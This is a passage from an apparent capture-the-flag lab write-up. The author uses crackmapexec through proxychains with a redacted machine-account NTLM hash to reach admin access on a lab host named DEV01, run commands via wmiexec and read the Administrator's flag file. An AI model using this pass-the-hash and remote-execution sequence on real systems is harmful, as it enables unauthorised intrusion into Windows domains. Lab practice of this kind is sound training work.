NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# So, valid creds. On target?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX --shares

SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$          READ,WRITE      Remote Admin
C$              READ,WRITE      Default share
IPC$            READ            Remote IPC


# Finally. Meaning, he can execute commands.
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX -x whoami

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
SMB         172.16.15.20    445    DEV01            [+] Executed command via wmiexec
SMB         172.16.15.20    445    DEV01            inlanefreight\XXXXXX$


# Read the flag?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX -x  "type C:\Users\Administrator\Desktop\flag.txt"


SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
SMB         172.16.15.20    445    DEV01            [+] Executed command via wmiexec
SMB         172.16.15.20    445    DEV01            XXXXXX
```


# Reflections

I was so close. Just need to forget assumptions and try EVERYTHING!!!!
